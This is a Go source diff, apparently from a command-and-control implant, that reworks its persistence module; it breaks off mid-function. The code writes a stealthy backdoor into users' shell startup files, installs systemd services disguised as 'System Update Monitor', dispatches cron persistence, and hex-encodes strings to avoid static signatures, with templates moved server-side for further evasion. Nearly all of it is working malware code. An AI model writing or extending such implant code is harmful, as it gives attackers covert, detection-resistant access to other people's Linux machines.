@@ -7,6 +7,8 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/user"
@@ -16,82 +18,93 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// Persistence strings (constructed to avoid static signatures)
+// PersistenceTemplate represents server-delivered template data
+type PersistenceTemplate struct {
+	Version   int               `json:"v"`
+	Type      string            `json:"t"`
+	Templates map[string]string `json:"tpl"`
+	Params    map[string]string `json:"p"`
+}
+
+// Template keys (must match server-side constants)
+const (
+	tplUnitHeader     = "unit_header"
+	tplDescPrefix     = "desc_prefix"
+	tplServiceSuffix  = "service_suffix"
+	tplAfterNetwork   = "after_network"
+	tplWantsNetwork   = "wants_network"
+	tplServiceHeader  = "service_header"
+	tplTypeSimple     = "type_simple"
+	tplRestartAlways  = "restart_always"
+	tplRestartSec     = "restart_sec"
+	tplExecStart      = "exec_start"
+	tplStdOutNull     = "stdout_null"
+	tplStdErrNull     = "stderr_null"
+	tplSecComment     = "sec_comment"
+	tplPrivateTmp     = "private_tmp"
+	tplNoNewPrivs     = "no_new_privs"
+	tplProtectSys     = "protect_sys"
+	tplProtectHome    = "protect_home"
+	tplReadWriteTmp   = "read_write_tmp"
+	tplInstallHeader  = "install_header"
+	tplWantedBy       = "wanted_by"
+	tplBashIfSudo     = "bash_if_sudo"
+	tplBashIfPgrep    = "bash_if_pgrep"
+	tplBashPgrepEnd   = "bash_pgrep_end"
+	tplBashNohup      = "bash_nohup"
+	tplBashNohupEnd   = "bash_nohup_end"
+	tplBashFi         = "bash_fi"
+	tplBashEndFi      = "bash_end_fi"
+)
+
+// Persistence strings - only essential ones for dispatch/paths (templates now delivered server-side)
 var (
-	// Command name
-	persistCmdName = string([]byte{0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74}) // persist
+	// Methods (needed for command dispatch)
+	persistMethodBashrc  = string([]byte{0x62, 0x61, 0x73, 0x68, 0x72, 0x63})       // bashrc
+	persistMethodSystemd = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64}) // systemd
+	persistMethodCron    = string([]byte{0x63, 0x72, 0x6f, 0x6e})                   // cron
+	persistMethodRemove  = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})       // remove
 
-	// Methods
-	persistMethodBashrc  = string([]byte{0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                   // bashrc
-	persistMethodSystemd = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64})             // systemd
-	persistMethodRemove  = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})                   // remove
+	// Short flags (all transformed from user-friendly flags on server side)
+	persistFlagRaw         = string([]byte{0x2d, 0x31})       // -1 (from --raw)
+	persistFlagNoNohup     = string([]byte{0x2d, 0x32})       // -2 (from --no-nohup)
+	persistFlagNoSilence   = string([]byte{0x2d, 0x33})       // -3 (from --no-silence)
+	persistFlagNoPgrep     = string([]byte{0x2d, 0x34})       // -4 (from --no-pgrep)
+	persistFlagNoSudoCheck = string([]byte{0x2d, 0x35})       // -5 (from --no-sudo-check)
+	persistFlagCommand     = string([]byte{0x2d, 0x36})       // -6 (from --command)
+	persistFlagFiles       = string([]byte{0x2d, 0x37})       // -7 (from --files)
+	persistFlagFile        = string([]byte{0x2d, 0x38})       // -8 (from --file)
+	persistFlagUser        = string([]byte{0x2d, 0x39})       // -9 (from --user)
+	persistFlagName        = string([]byte{0x2d, 0x6e})       // -n (from --name)
+	persistFlagAll         = string([]byte{0x2d, 0x61})       // -a (from --all)
 
-	// Flags
-	persistFlagUser    = string([]byte{0x2d, 0x2d, 0x75, 0x73, 0x65, 0x72})                                     // --user
-	persistFlagCommand = string([]byte{0x2d, 0x2d, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64})                   // --command
-	persistFlagFile    = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x65})                                     // --file
-	persistFlagFiles   = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x65, 0x73})                               // --files
-	persistFlagName    = string([]byte{0x2d, 0x2d, 0x6e, 0x61, 0x6d, 0x65})                                     // --name
+	// Paths (needed for file operations)
+	persistProcSelfExe = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65})                                 // /proc/self/exe
+	persistEtcSystemd  = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d}) // /etc/systemd/system
+	persistDotConfig   = string([]byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67})                                                                           // .config
+	persistSystemdDir  = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64})                                                                           // systemd
+	persistUserDir     = string([]byte{0x75, 0x73, 0x65, 0x72})                                                                                             // user
+	persistServiceExt  = string([]byte{0x2e, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                                     // .service
 
-	// Paths
-	persistProcSelfExe   = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65})                                                                               // /proc/self/exe
-	persistEtcSystemd    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d})                                                 // /etc/systemd/system
-	persistDotConfig     = string([]byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67})                                                                                                                         // .config
-	persistSystemdDir    = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64})                                                                                                                         // systemd
-	persistUserDir       = string([]byte{0x75, 0x73, 0x65, 0x72})                                                                                                                                           // user
-	persistServiceExt    = string([]byte{0x2e, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                                                                                   // .service
-
-	// RC files
-	persistBashrc      = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                                           // .bashrc
-	persistProfile     = string([]byte{0x2e, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})                                     // .profile
-	persistBashProfile = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})       // .bash_profile
-	persistZshrc       = string([]byte{0x2e, 0x7a, 0x73, 0x68, 0x72, 0x63})                                                 // .zshrc
-	persistTildeSlash  = string([]byte{0x7e, 0x2f})                                                                         // ~/
+	// RC files (needed for default file list)
+	persistBashrc      = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                                     // .bashrc
+	persistProfile     = string([]byte{0x2e, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})                               // .profile
+	persistBashProfile = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65}) // .bash_profile
+	persistZshrc       = string([]byte{0x2e, 0x7a, 0x73, 0x68, 0x72, 0x63})                                           // .zshrc
+	persistTildeSlash  = string([]byte{0x7e, 0x2f})                                                                   // ~/
 
 	// Default service name
 	persistDefaultSvc = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65}) // system-update
 
-	// Systemd targets
-	persistMultiUserTarget      = string([]byte{0x6d, 0x75, 0x6c, 0x74, 0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74})                                                       // multi-user.target
-	persistDefaultTarget        = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74})                                                                         // default.target
-	persistMultiUserTargetWants = string([]byte{0x6d, 0x75, 0x6c, 0x74, 0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73})                   // multi-user.target.wants
-	persistDefaultTargetWants   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73})                                     // default.target.wants
+	// Symlink directories (needed for enabling services)
+	persistMultiUserTargetWants = string([]byte{0x6d, 0x75, 0x6c, 0x74, 0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73}) // multi-user.target.wants
+	persistDefaultTargetWants   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73})                   // default.target.wants
 
-	// Service descriptions
-	persistDescSystem = string([]byte{0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x20, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x20, 0x4d, 0x6f, 0x6e, 0x69, 0x74, 0x6f, 0x72})             // System Update Monitor
-	persistDescUser   = string([]byte{0x55, 0x73, 0x65, 0x72, 0x20, 0x53, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72})                   // User Session Manager
+	// Kept for cleanup detection (used in cleanRCFile to find injected payload)
+	persistBashIfSudo = string([]byte{0x69, 0x66, 0x20, 0x5b, 0x20, 0x2d, 0x7a, 0x20, 0x22, 0x24, 0x53, 0x55, 0x44, 0x4f, 0x5f, 0x43, 0x4f, 0x4d, 0x4d, 0x41, 0x4e, 0x44, 0x22, 0x20, 0x5d, 0x3b, 0x20, 0x74, 0x68, 0x65, 0x6e}) // if [ -z "$SUDO_COMMAND" ]; then
 
-	// Systemd service template parts
-	persistUnitHeader     = string([]byte{0x5b, 0x55, 0x6e, 0x69, 0x74, 0x5d})                                                                                                                               // [Unit]
-	persistDescPrefix     = string([]byte{0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x3d})                                                                                           // Description=
-	persistServiceSuffix  = string([]byte{0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                                                                                   //  Service
-	persistAfterNetwork   = string([]byte{0x41, 0x66, 0x74, 0x65, 0x72, 0x3d, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2d, 0x6f, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74}) // After=network.target network-online.target
-	persistWantsNetwork   = string([]byte{0x57, 0x61, 0x6e, 0x74, 0x73, 0x3d, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2d, 0x6f, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74}) // Wants=network-online.target
-	persistServiceHeader  = string([]byte{0x5b, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x5d})                                                                                                             // [Service]
-	persistTypeSimple     = string([]byte{0x54, 0x79, 0x70, 0x65, 0x3d, 0x73, 0x69, 0x6d, 0x70, 0x6c, 0x65})                                                                                                 // Type=simple
-	persistRestartAlways  = string([]byte{0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x3d, 0x61, 0x6c, 0x77, 0x61, 0x79, 0x73})                                                                               // Restart=always
-	persistRestartSec     = string([]byte{0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x53, 0x65, 0x63, 0x3d, 0x36, 0x30})                                                                                     // RestartSec=60
-	persistExecStart      = string([]byte{0x45, 0x78, 0x65, 0x63, 0x53, 0x74, 0x61, 0x72, 0x74, 0x3d})                                                                                                       // ExecStart=
-	persistStdOutNull     = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x3d, 0x6e, 0x75, 0x6c, 0x6c})                                                 // StandardOutput=null
-	persistStdErrNull     = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x3d, 0x6e, 0x75, 0x6c, 0x6c})                                                       // StandardError=null
-	persistSecComment     = string([]byte{0x23, 0x20, 0x53, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x20, 0x68, 0x61, 0x72, 0x64, 0x65, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x28, 0x6d, 0x61, 0x6b, 0x65, 0x73, 0x20, 0x69, 0x74, 0x20, 0x6c, 0x6f, 0x6f, 0x6b, 0x20, 0x6c, 0x65, 0x67, 0x69, 0x74, 0x69, 0x6d, 0x61, 0x74, 0x65, 0x29}) // # Security hardening (makes it look legitimate)
-	persistPrivateTmp     = string([]byte{0x50, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x54, 0x6d, 0x70, 0x3d, 0x79, 0x65, 0x73})                                                                               // PrivateTmp=yes
-	persistNoNewPrivs     = string([]byte{0x4e, 0x6f, 0x4e, 0x65, 0x77, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x73, 0x3d, 0x74, 0x72, 0x75, 0x65})                                           // NoNewPrivileges=true
-	persistProtectSys     = string([]byte{0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x3d, 0x73, 0x74, 0x72, 0x69, 0x63, 0x74})                                           // ProtectSystem=strict
-	persistProtectHome    = string([]byte{0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x48, 0x6f, 0x6d, 0x65, 0x3d, 0x72, 0x65, 0x61, 0x64, 0x2d, 0x6f, 0x6e, 0x6c, 0x79})                                     // ProtectHome=read-only
-	persistReadWriteTmp   = string([]byte{0x52, 0x65, 0x61, 0x64, 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x61, 0x74, 0x68, 0x73, 0x3d, 0x2f, 0x74, 0x6d, 0x70})                                                 // ReadWritePaths=/tmp
-	persistInstallHeader  = string([]byte{0x5b, 0x49, 0x6e, 0x73, 0x74, 0x61, 0x6c, 0x6c, 0x5d})                                                                                                             // [Install]
-	persistWantedBy       = string([]byte{0x57, 0x61, 0x6e, 0x74, 0x65, 0x64, 0x42, 0x79, 0x3d})                                                                                                             // WantedBy=
-
-	// Bash payload template parts
-	persistBashIfSudo    = string([]byte{0x69, 0x66, 0x20, 0x5b, 0x20, 0x2d, 0x7a, 0x20, 0x22, 0x24, 0x53, 0x55, 0x44, 0x4f, 0x5f, 0x43, 0x4f, 0x4d, 0x4d, 0x41, 0x4e, 0x44, 0x22, 0x20, 0x5d, 0x3b, 0x20, 0x74, 0x68, 0x65, 0x6e})                                                 // if [ -z "$SUDO_COMMAND" ]; then
-	persistBashIfPgrep   = string([]byte{0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x21, 0x20, 0x70, 0x67, 0x72, 0x65, 0x70, 0x20, 0x2d, 0x66, 0x20, 0x22})                                                                                                                         //     if ! pgrep -f "
-	persistBashPgrepEnd  = string([]byte{0x22, 0x20, 0x3e, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c, 0x20, 0x32, 0x3e, 0x26, 0x31, 0x3b, 0x20, 0x74, 0x68, 0x65, 0x6e})                                                                                           // " > /dev/null 2>&1; then
-	persistBashNohup     = string([]byte{0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x28, 0x6e, 0x6f, 0x68, 0x75, 0x70, 0x20})                                                                                                                                                 //         (nohup
-	persistBashNohupEnd  = string([]byte{0x20, 0x3e, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c, 0x20, 0x32, 0x3e, 0x26, 0x31, 0x20, 0x26, 0x29, 0x20, 0x32, 0x3e, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c})                                           //  > /dev/null 2>&1 &) 2>/dev/null
-	persistBashFi        = string([]byte{0x20, 0x20, 0x20, 0x20, 0x66, 0x69})                                                                                                                                                                                                       //     fi
-	persistBashEndFi     = string([]byte{0x66, 0x69})                                                                                                                                                                                                                               // fi
-	persistAmpersand     = string([]byte{0x20, 0x26})                                                                                                                                                                                                                               //  &
+	// Misc
+	persistAmpersand = string([]byte{0x20, 0x26}) //  &
 )
 
 // PersistenceCommand handles various persistence mechanisms
@@ -105,12 +118,27 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 		}
 	}
 
+	// Parse template data from command if present
+	var template *PersistenceTemplate
+	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
+			template = &PersistenceTemplate{}
+			if err := json.Unmarshal(decoded, template); err != nil {
+				template = nil // Failed to parse, will use hardcoded fallback
+			}
+		}
+	}
+
 	method := args[0]
 	switch method {
 	case persistMethodBashrc:
-		return c.handleBashrcPersistence(args[1:])
+		return c.handleBashrcPersistence(args[1:], template)
 	case persistMethodSystemd:
-		return c.handleSystemdPersistence(args[1:])
+		return c.handleSystemdPersistence(args[1:], template)
+	case persistMethodCron:
+		// Delegate to CronPersistenceCommand (cron methods: spool, crond, periodic, anacron, timer)
+		cronCmd := &CronPersistenceCommand{}
+		return cronCmd.Execute(ctx, args[1:])
 	case persistMethodRemove:
 		if len(args) < 2 {
 			return CommandResult{
@@ -127,11 +155,22 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 	}
 }
 
+// bashrcOptions holds payload generation options
+type bashrcOptions struct {
+	raw         bool // Just the command, no wrapping
+	noNohup     bool // Skip nohup wrapper
+	noSilence   bool // Don't redirect to /dev/null
+	noPgrep     bool // Don't check if process already running
+	noSudoCheck bool // Don't check SUDO_COMMAND
+}
+
 // handleBashrcPersistence adds backdoor to shell initialization files
-func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResult {
+func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *PersistenceTemplate) CommandResult {
 	var targetUser string
 	var command string
 	var targetFiles []string
+	var allFiles bool
+	var opts bashrcOptions
 
 	// Parse arguments
 	for i := 0; i < len(args); i++ {
@@ -160,6 +199,18 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResul
 				}
 				i++
 			}
+		case persistFlagAll:
+			allFiles = true
+		case persistFlagRaw:
+			opts.raw = true
+		case persistFlagNoNohup:
+			opts.noNohup = true
+		case persistFlagNoSilence:
+			opts.noSilence = true
+		case persistFlagNoPgrep:
+			opts.noPgrep = true
+		case persistFlagNoSudoCheck:
+			opts.noSudoCheck = true
 		}
 	}
 
@@ -193,13 +244,19 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResul
 		}
 	}
 
-	// If no files specified, use defaults
-	if len(targetFiles) == 0 {
+	// Determine target files based on flags
+	if allFiles {
+		// --all: target all common RC files
 		targetFiles = []string{
 			filepath.Join(u.HomeDir, persistBashrc),
 			filepath.Join(u.HomeDir, persistProfile),
 			filepath.Join(u.HomeDir, persistBashProfile),
 			filepath.Join(u.HomeDir, persistZshrc),
+		}
+	} else if len(targetFiles) == 0 {
+		// No files specified: default to only .bashrc
+		targetFiles = []string{
+			filepath.Join(u.HomeDir, persistBashrc),
 		}
 	} else {
 		// Expand paths for specified files
@@ -216,8 +273,14 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResul
 
 	var results []string
 
-	// Backdoor payload without marker
-	backdoorPayload := c.generateBashrcPayload(command)
+	// Generate backdoor payload using server-provided template
+	backdoorPayload := c.generateBashrcPayload(command, template, opts)
+	if backdoorPayload == "" {
+		return CommandResult{
+			Output:   Err(E18), // Template data required from server
+			ExitCode: 1,
+		}
+	}
 
 	for _, file := range targetFiles {
 		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
@@ -233,24 +296,87 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResul
 	}
 }
 
-// generateBashrcPayload creates a stealthy backdoor payload
-func (c *PersistenceCommand) generateBashrcPayload(command string) string {
-	// Create payload without marker for better stealth using hex-constructed strings
+// generateBashrcPayload creates a stealthy backdoor payload using server-provided templates
+func (c *PersistenceCommand) generateBashrcPayload(command string, template *PersistenceTemplate, opts bashrcOptions) string {
+	// If --raw is specified, just return the command itself
+	if opts.raw {
+		return "\n" + command + "\n"
+	}
+
+	// Template is required - templates are now delivered server-side
+	if template == nil || template.Templates == nil {
+		return "" // Will cause error in caller
+	}
+
+	// Helper to get template value (required)
+	getVal := func(key string) string {
+		if val, ok := template.Templates[key]; ok {
+			return val
+		}
+		return ""
+	}
+
+	// Build payload based on options
 	var payload strings.Builder
 	payload.WriteString("\n")
-	payload.WriteString(persistBashIfSudo)
+
+	// Track indentation level based on what wrappers are active
+	indent := ""
+
+	// Start SUDO_COMMAND check (unless --no-sudo-check)
+	if !opts.noSudoCheck {
+		payload.WriteString(getVal(tplBashIfSudo))
+		payload.WriteString("\n")
+		indent = "    "
+	}
+
+	// Start pgrep check (unless --no-pgrep)
+	if !opts.noPgrep {
+		payload.WriteString(indent)
+		payload.WriteString(getVal(tplBashIfPgrep))
+		payload.WriteString(command)
+		payload.WriteString(getVal(tplBashPgrepEnd))
+		payload.WriteString("\n")
+		indent += "    "
+	}
+
+	// Write the command execution line
+	payload.WriteString(indent)
+	if opts.noNohup && opts.noSilence {
+		// Just the command with background
+		payload.WriteString(command)
+		payload.WriteString(" &")
+	} else if opts.noNohup {
+		// No nohup but still silence output
+		payload.WriteString("(")
+		payload.WriteString(command)
+		payload.WriteString(" > /dev/null 2>&1 &) 2>/dev/null")
+	} else if opts.noSilence {
+		// Use nohup but don't redirect to /dev/null
+		payload.WriteString("(nohup ")
+		payload.WriteString(command)
+		payload.WriteString(" &) 2>/dev/null")
+	} else {
+		// Full wrapping: nohup + silence (default)
+		payload.WriteString(getVal(tplBashNohup))
+		payload.WriteString(command)
+		payload.WriteString(getVal(tplBashNohupEnd))
+	}
 	payload.WriteString("\n")
-	payload.WriteString(persistBashIfPgrep)
-	payload.WriteString(command)
-	payload.WriteString(persistBashPgrepEnd)
-	payload.WriteString("\n")
-	payload.WriteString(persistBashNohup)
-	payload.WriteString(command)
-	payload.WriteString(persistBashNohupEnd)
-	payload.WriteString("\n")
-	payload.WriteString(persistBashFi)
-	payload.WriteString("\n")
-	payload.WriteString(persistBashEndFi)
+
+	// Close pgrep check (unless --no-pgrep)
+	if !opts.noPgrep {
+		if !opts.noSudoCheck {
+			payload.WriteString("    ")
+		}
+		payload.WriteString(getVal(tplBashFi))
+		payload.WriteString("\n")
+	}
+
+	// Close SUDO_COMMAND check (unless --no-sudo-check)
+	if !opts.noSudoCheck {
+		payload.WriteString(getVal(tplBashEndFi))
+	}
 
 	return payload.String()
 }
@@ -287,7 +413,7 @@ func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) e
 }
 
 // handleSystemdPersistence installs systemd service
-func (c *PersistenceCommand) handleSystemdPersistence(args []string) CommandResult {
+func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *PersistenceTemplate) CommandResult {
 	var serviceName string
 	var userService bool
 
@@ -316,13 +442,13 @@ func (c *PersistenceCommand) handleSystemdPersistence(args []string) CommandResu
 	}
 
 	if userService {
-		return c.installUserSystemdService(serviceName, execPath)
+		return c.installUserSystemdService(serviceName, execPath, template)
 	}
-	return c.installSystemSystemdService(serviceName, execPath)
+	return c.installSystemSystemdService(serviceName, execPath, template)
 }
 
 // installUserSystemdService creates user-level systemd service
-func (c *PersistenceCommand) installUserSystemdService(name string, execPath string) CommandResult {
+func (c *PersistenceCommand) installUserSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
 	// Get current user
 	currentUser, err := user.Current()
 	if err != nil {
@@ -346,8 +472,14 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 	// Service file path
 	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)
 
-	// Generate service content
-	serviceContent := c.generateSystemdService(name, execPath, true)
+	// Generate service content using server-provided template
+	serviceContent := c.generateSystemdService(name, execPath, true, template)
+	if serviceContent == "" {
+		return CommandResult{
+			Output:   Err(E18), // Template data required from server
+			ExitCode: 1,
+		}
+	}
 
 	// Write service file
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
@@ -373,7 +505,7 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 }
 
 // installSystemSystemdService creates system-level systemd service
-func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string) CommandResult {
+func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
 	// System systemd directory
 	systemdDir := persistEtcSystemd
 
@@ -388,8 +520,14 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 	// Service file path
 	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)
 
-	// Generate service content
-	serviceContent := c.generateSystemdService(name, execPath, false)
+	// Generate service content using server-provided template
+	serviceContent := c.generateSystemdService(name, execPath, false, template)
+	if serviceContent == "" {
+		return CommandResult{
+			Output:   Err(E18), // Template data required from server
+			ExitCode: 1,
+		}
+	}
 
 	// Write service file
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
@@ -412,62 +550,77 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 	}
 }
 
-// generateSystemdService creates systemd service configuration
-func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool) string {
-	// Generate a plausible looking service using hex-constructed strings
+// generateSystemdService creates systemd service configuration using server-provided templates
+func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool, template *PersistenceTemplate) string {
+	// Template is required - templates are now delivered server-side
+	if template == nil || template.Templates == nil {
+		return "" // Will cause error in caller
+	}
+
+	// Helper to get template value (required)
+	getVal := func(key string) string {
+		if val, ok := template.Templates[key]; ok {
+			return val
+		}
+		return ""
+	}
+
+	// Helper to get param value with default
+	getParam := func(key, defaultVal string) string {
+		if template.Params != nil {
+			if val, ok := template.Params[key]; ok && val != "" {
+				return val
+			}
+		}
+		return defaultVal
+	}
+
+	// Get description and target from template params
+	description := getParam("description", "")
+	target := getParam("target", "")
+
+	// Build service file content using server-provided template values
 	var svc strings.Builder
-
-	description := persistDescSystem
-	if userService {
-		description = persistDescUser
-	}
-
-	target := persistMultiUserTarget
-	if userService {
-		target = persistDefaultTarget
-	}
-
-	// Build service file content
-	svc.WriteString(persistUnitHeader)
+	svc.WriteString(getVal(tplUnitHeader))
 	svc.WriteString("\n")
-	svc.WriteString(persistDescPrefix)
+	svc.WriteString(getVal(tplDescPrefix))
 	svc.WriteString(description)
-	svc.WriteString(persistServiceSuffix)
+	svc.WriteString(getVal(tplServiceSuffix))
 	svc.WriteString("\n")
-	svc.WriteString(persistAfterNetwork)
+	svc.WriteString(getVal(tplAfterNetwork))
 	svc.WriteString("\n")
-	svc.WriteString(persistWantsNetwork)
+	svc.WriteString(getVal(tplWantsNetwork))
 	svc.WriteString("\n\n")
-	svc.WriteString(persistServiceHeader)
+	svc.WriteString(getVal(tplServiceHeader))
 	svc.WriteString("\n")
-	svc.WriteString(persistTypeSimple)
+	svc.WriteString(getVal(tplTypeSimple))
 	svc.WriteString("\n")
-	svc.WriteString(persistRestartAlways)
+	svc.WriteString(getVal(tplRestartAlways))
 	svc.WriteString("\n")
-	svc.WriteString(persistRestartSec)
+	svc.WriteString(getVal(tplRestartSec))
 	svc.WriteString("\n")
-	svc.WriteString(persistExecStart)
+	svc.WriteString(getVal(tplExecStart))
 	svc.WriteString(execPath)
 	svc.WriteString("\n")
-	svc.WriteString(persistStdOutNull)
+	svc.WriteString(getVal(tplStdOutNull))
 	svc.WriteString("\n")
-	svc.WriteString(persistStdErrNull)
+	svc.WriteString(getVal(tplStdErrNull))
 	svc.WriteString("\n\n")
-	svc.WriteString(persistSecComment)
+	svc.WriteString(getVal(tplSecComment))
 	svc.WriteString("\n")
-	svc.WriteString(persistPrivateTmp)
+	svc.WriteString(getVal(tplPrivateTmp))
 	svc.WriteString("\n")
-	svc.WriteString(persistNoNewPrivs)
+	svc.WriteString(getVal(tplNoNewPrivs))
 	svc.WriteString("\n")
-	svc.WriteString(persistProtectSys)
+	svc.WriteString(getVal(tplProtectSys))
 	svc.WriteString("\n")
-	svc.WriteString(persistProtectHome)
+	svc.WriteString(getVal(tplProtectHome))
 	svc.WriteString("\n")
-	svc.WriteString(persistReadWriteTmp)
+	svc.WriteString(getVal(tplReadWriteTmp))
 	svc.WriteString("\n\n")
-	svc.WriteString(persistInstallHeader)
+	svc.WriteString(getVal(tplInstallHeader))
 	svc.WriteString("\n")
-	svc.WriteString(persistWantedBy)
